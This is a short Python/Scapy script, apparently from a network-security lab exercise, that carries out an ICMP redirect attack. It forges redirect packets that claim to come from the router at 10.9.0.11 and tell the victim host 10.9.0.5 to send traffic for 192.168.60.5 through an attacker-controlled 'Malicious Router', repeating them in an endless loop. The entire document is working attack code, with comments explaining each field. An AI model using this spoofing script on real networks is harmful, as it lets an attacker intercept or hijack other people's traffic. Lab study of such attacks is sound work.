#!/usr/bin/python3
from scapy.all import *
ip=IP(src="10.9.0.11",dst="10.9.0.5")#pretend the ICMP package comes from Router (10.9.0.11)
# the destination is our victim 10.9.0.5
icmp=ICMP(type=5,code=1)# we set type=5 Redirect route ,code=1, the destination host was unreachable
icmp.gw="192.168.60.6"# set the new route as Malicious Router 
ip2=IP(src="10.9.0.5",dst="192.168.60.5")# triger then Router, send to Extranet
while True:
	send(ip/icmp/ip2/ICMP())# ip2/ICMP() as payload in the datapart
